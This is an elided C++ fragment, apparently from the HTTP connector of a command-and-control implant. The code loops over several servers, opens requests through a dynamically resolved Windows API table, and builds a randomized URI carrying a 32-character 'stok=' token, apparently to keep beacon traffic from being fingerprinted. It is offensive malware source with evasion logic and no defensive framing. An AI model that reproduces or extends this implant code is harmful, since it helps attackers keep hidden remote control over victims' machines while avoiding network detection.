	...
	while ( !connected && attempt < this->server_count) {
		...
		if ( this->hInternet ) {
			...
			if ( this->hConnect )
			{
				...
				CHAR* randomizedUri = BuildRandomizedURI();
				HINTERNET hRequest = this->functions->HttpOpenRequestA(
					this->hConnect,
					this->http_method,
					randomizedUri,  
					0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context
				);
				this->functions->LocalFree(randomizedUri);
				if (hRequest) {
					if (this->ssl) {
						DWORD dwFlags;
...
CHAR* ConnectorHTTP::GenerateRandomToken()
{
	ULONG random1 = GenerateRandom32();
	ULONG random2 = GenerateRandom32();
	ULONG random3 = GenerateRandom32();
	ULONG random4 = GenerateRandom32();

	CHAR* token = (CHAR*)this->functions->LocalAlloc(LPTR, 33);
	CHAR hexChars[] = "0123456789ABCDEF";

	for (int i = 0; i < 4; i++) {
		ULONG value;
		switch (i) {
		case 0: value = random1; break;
		case 1: value = random2; break;
		case 2: value = random3; break;
		case 3: value = random4; break;
		}

		for (int j = 0; j < 8; j++) {
			token[i * 8 + j] = hexChars[(value >> (28 - j * 4)) & 0xF];
		}
	}
	token[32] = 0;
	return token;
...
CHAR* ConnectorHTTP::BuildRandomizedURI()
{
	CHAR* token = GenerateRandomToken();
	ULONG uriLen = _strlen(this->uri);
	ULONG tokenLen = _strlen(token);

	CHAR* newUri = (CHAR*)this->functions->LocalAlloc(LPTR, tokenLen + uriLen + 6);
	memcpy(newUri, "stok=", 5);
	memcpy(newUri + 5, token, tokenLen);
	newUri[5 + tokenLen] = '/';
	memcpy(newUri + 6 + tokenLen, this->uri, uriLen);
	newUri[6 + tokenLen + uriLen] = 0;

	this->functions->LocalFree(token);
	return newUri;
}
